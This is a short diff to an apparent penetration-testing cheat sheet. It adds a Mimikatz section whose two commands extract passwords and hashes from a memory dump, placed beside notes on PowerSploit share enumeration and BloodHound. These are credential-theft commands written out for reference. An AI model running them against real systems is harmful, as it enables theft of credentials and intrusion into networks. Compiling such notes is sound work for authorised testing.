@@ -44,6 +44,14 @@ Find-DomainShare -CheckShareAccess
 
 All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
 
+### Mimikatz
+
+Retrieve password/hash from a dump file :
+```markdown
+sekurlsa::minidump “XXXXXXXXX.DMP”
+sekurlsa::logonPasswords
+```
+
 ### PowerShell one-liners
 
 Bloodhound : Using ingestors to collect the data and then send it to BloodHound.
